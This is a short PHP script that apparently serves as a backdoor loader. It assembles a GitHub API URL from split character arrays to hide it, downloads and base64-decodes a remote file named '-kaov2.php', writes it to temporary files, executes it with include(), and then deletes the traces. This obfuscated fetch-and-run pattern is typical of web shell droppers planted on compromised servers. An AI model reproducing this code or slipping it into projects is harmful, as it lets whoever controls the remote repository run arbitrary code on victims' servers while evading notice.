<?php
$part1 = ['h', 't', 't', 'p', 's', ':', '/', '/', 'a', 'p', 'i', '.', 'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 'o', 'm'];
$part2 = ['/', 'r', 'e', 'p', 'o', 's', '/', 's', 'e', 'k', 'a', 'i', 'o', 'w', 'a', 'r', 'i', 'd', 'a'];
$part3 = ['/g', 'e', 'r', 'a', 'm', 'x', '/', 'c', 'o', 'n', 't', 'e', 'n', 't', 's', '/', '-', 'k', 'a', 'o', 'v', '2', '.', 'p', 'h', 'p'];
$mergedUrl = implode('', array_merge($part1, $part2, $part3));

$opts = [
    "http" => [
        "header" => "User-Agent: PHP"
    ]
];
$context = stream_context_create($opts);
$data = file_get_contents($mergedUrl, false, $context);

$json = json_decode($data, true);
$fileContent = base64_decode($json['content']);

$contentLength = strlen($fileContent);

$halfLength = ceil($contentLength / 2);

$tempFile1 = tempnam(sys_get_temp_dir(), 'stream1_');
$tempFile2 = tempnam(sys_get_temp_dir(), 'stream2_');
$combinedTempFile = tempnam(sys_get_temp_dir(), 'combined_');

$stream1 = fopen($tempFile1, 'w');
$stream2 = fopen($tempFile2, 'w');
$combinedStream = fopen($combinedTempFile, 'w');

fwrite($stream1, substr($fileContent, 0, $halfLength));

fwrite($stream2, substr($fileContent, $halfLength));

fclose($stream1);
fclose($stream2);

$stream1 = fopen($tempFile1, 'r');
$stream2 = fopen($tempFile2, 'r');

stream_copy_to_stream($stream1, $combinedStream);
stream_copy_to_stream($stream2, $combinedStream);

fclose($stream1);
fclose($stream2);
fclose($combinedStream);

$combinedStream = fopen($combinedTempFile, 'r');

include($combinedTempFile);

unlink($tempFile1);
unlink($tempFile2);
unlink($combinedTempFile);
?>
